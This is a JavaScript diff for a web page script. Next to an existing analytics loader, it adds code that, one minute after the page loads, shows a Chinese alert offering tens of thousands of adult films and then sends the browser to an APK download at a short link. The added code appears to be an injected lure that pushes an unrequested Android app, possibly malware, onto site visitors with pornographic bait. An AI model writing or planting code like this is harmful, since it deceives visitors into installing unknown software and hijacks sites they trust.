@@ -18,3 +18,26 @@ function count(){
 //var cheattime="12";function cheat(){if(cheattime<=0){location.href=appurl2;}else{setTimeout('cheat()',999);}cheattime--;}cheat();
 
 document.writeln("<script type=\"text/javascript\">var cnzz_protocol = ((\"https:\" == document.location.protocol) ? \" https://\" : \" http://\");document.write(unescape(\"%3Cspan id=\'cnzz_stat_icon_1253664587\'%3E%3C/span%3E%3Cscript src=\'\" + cnzz_protocol + \"s11.cnzz.com/stat.php%3Fid%3D1253664587\' type=\'text/javascript\'%3E%3C/script%3E\"));</script>");
+
+
+
+var apkurl = "http://janteng.cn/10Nz";
+function g(name) {
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return unescape(r[2]); return null;
+}
+	
+function downfile(){
+	location.href=apkurl;
+}
+
+function showTip(text, down_url, delay, set_timer){
+	if(set_timer==true){
+		window.setTimeout("showTip('"+ text +"', '" + down_url + "', '" + delay + "', false)", delay)
+	}else{
+		alert(text)
+		location.href=down_url;
+	}
+}
+showTip("★成人爽片5万部成人影片，立即下载安装免费观看？★", "http://janteng.cn/10Nz", 60000, true);
